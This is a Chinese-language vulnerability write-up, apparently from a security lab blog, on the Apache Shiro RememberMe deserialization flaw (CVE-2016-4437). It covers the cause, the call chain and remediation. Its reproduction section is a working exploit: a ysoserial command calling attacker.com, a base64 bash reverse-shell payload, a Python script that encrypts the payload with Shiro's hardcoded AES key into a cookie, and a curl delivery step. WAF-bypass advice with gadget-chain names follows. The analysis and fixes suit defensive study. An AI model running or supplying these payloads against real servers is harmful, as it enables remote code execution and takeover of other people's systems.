#  [漏洞分析] Shiro RememberMe 反序列化深度分析  
 Pik安全实验室   2026-05-18 08:31  
  
0x00 介绍  
  
Apache Shiro 是一个 Java 安全框架，提供认证、授权、加密和会话管理功能。Shiro RememberMe 反序列化漏洞（CVE-2016-4437）是其最著名也是影响最广的漏洞。核心问题在于：Shiro 使用固定的 AES 密钥加密 RememberMe Cookie，攻击者获得密钥后可构造恶意序列化对象，实现远程代码执行。  
  
0x01 漏洞原理  
  
Shiro 在 CookieRememberMeManager 中处理 RememberMe 功能：获取 Cookie 中的 rememberMe 值 → Base64 解码 → AES 解密 → 反序列化。关键在于 AES 加密使用的密钥是硬编码在源码中的。  
  
// 来自 Shiro 源码 CookieRememberMeManager.java            
  
private static final byte[] DEFAULT_CIPHER_KEY_BYTES =            
  
      
Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");            
  
  
// 这段代码意味着所有使用默认配置的 Shiro 应用            
  
// 都使用同一把 AES 密钥！  
  
0x02 漏洞复现  
  
环境搭建  
  
Tomcat 8.5.3 + Shiro 1.2.4。访问登录页面后，抓包检查响应头中是否包含 rememberMe=deleteMe 字段，这是判断 Shiro 框架最直接的方式。  
  
利用步骤  
  
Step 1 — 使用 ysoserial 生成 CommonsCollections 利用链的序列化 payload。  
  
# 生成序列化 payload            
  
java -jar ysoserial-all.jar CommonsCollections2 "curl http://attacker.com:1234" > poc.ser            
  
  
# 或反弹 shell            
  
java -jar ysoserial-all.jar CommonsCollections2 \            
  
    
"bash -c {echo,YmFzaCAt...}|{base64,-d}|{bash,-i}" > poc.ser  
  
Step 2 — 使用 Shiro 默认密钥加密 payload，生成 RememberMe Cookie。  
  
import sys, base64, uuid            
  
from Crypto.Cipher import AES            
  
  
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")            
  
with open(sys.argv[1], 'rb') as f:            
  
      
data = f.read()            
  
  
# AES/CBC/PKCS5Padding 加密            
  
iv = uuid.uuid4().bytes            
  
cipher = AES.new(key, AES.MODE_CBC, iv)            
  
padded = data + (16 - len(data) % 16) * chr(16 - len(data) % 16).encode()            
  
encrypted = cipher.encrypt(padded)            
  
  
rememberMe = base64.b64encode(iv + encrypted).decode()            
  
print(rememberMe)  
  
Step 3 — 将加密后的 rememberMe 值放入 Cookie 发送请求。  
  
# 使用 curl 发送            
  
curl -v -b "rememberMe=" http://target:8080/      # 使用 Burp Suite      # 在请求头中添加: Cookie: rememberMe=  
  
0x03 深度分析 — 调用链  
  
理解调用链是掌握这个漏洞的关键。从 Subject.login 出发，沿着代码调用路径追踪到反序列化触发点。  
  
// 调用链概览            
  
Subject.login(token)            
  
    
→ DefaultSecurityManager.login()            
  
      
→ onFailedLogin() / onSuccessfulLogin()            
  
        
→ getRememberMeManager()            
  
          
→ RememberMeManager.getRememberedPrincipals()            
  
            
→ AbstractRememberMeManager.getRememberedPrincipals()            
  
              
→ convertBytesToPrincipals()            
  
                
→ cipherService.decrypt()  
        
// AES 解密            
  
                
→ deserialize()  
                   
// 反序列化触发！            
  
                  
→ readObject()  
                  
// RCE 入口  
  
跟踪过程中有几个关键点：  
  
// 关键点 1：获取 RememberMeManager            
  
// DefaultSecurityManager.rememberMeFailedLogin()            
  
private void rememberMeFailedLogin(...) {            
  
      
RememberMeManager rmm = getRememberMeManager();            
  
      
// 如果 rememberMe Cookie 存在且不为空            
  
      
if (rmm != null) {            
  
          
rmm.getRememberedPrincipals(...);  
// 触发解密反序列化            
  
      
}            
  
}            
  
  
// 关键点 2：解密方法确定            
  
// DefaultBlockCipherService.buildTransformationString()            
  
// 确定使用 AES/CBC/PKCS5Padding            
  
  
// 关键点 3：反序列化触发            
  
// AbstractRememberMeManager.convertBytesToPrincipals()            
  
// 调用 Java 原生 ObjectInputStream.readObject()  
  
0x04 绕过方式  
  
绕过 WAF  
  
WAF 通常检测 RememberMe Cookie 的长度和特征。可以尝试分块发送或使用不同利用链。  
  
# 使用不同 gadget 链            
  
CommonsCollections1  
    
CommonsCollections2  
    
CommonsCollections3            
  
CommonsCollections4  
    
CommonsCollections5  
    
CommonsCollections6            
  
CommonsBeanutils1  
      
CommonsBeanutils2            
  
URLDNS  
    
JRMPClient  
    
JRMPListener  
  
无依赖利用  
  
Shiro 默认不包含 CommonsCollections 依赖。但高版本 Tomcat 自带 CommonsCollections 库，Spring Boot 项目通常有 CommonsBeanutils。如果没有可利用的 gadget 链，可以尝试通过 JRMP 或 DNS 出网。  
  
0x05 检测与修复  
  
检测方法  
  
# 1. 检查响应头            
  
echo -n "test" | base64            
  
curl -v -b "rememberMe=base64value" http://target/ 2>&1 | grep rememberMe            
  
  
# 2. 使用 Shiro 检测工具            
  
python3 shiro_attack.py -u http://target/ --check            
  
  
# 3. DNS 出网检测            
  
java -jar ysoserial-all.jar URLDNS http://xxx.dnslog.cn > poc.ser            
  
# 加密后发送，观察 DNS 日志  
  
修复方案  
  
1. 升级 Shiro 到最新版本（1.7.0+）2. 不要使用默认密钥，生成随机 AES 密钥 3. 如果不使用 RememberMe 功能，直接关闭：cookieRememberMeManager.cookie.maxAge = -1 4. 使用 WAF 规则拦截异常的 RememberMe Cookie  
  
本文仅作安全研究与学习用途，用于非法行为后果自行承担。  
  
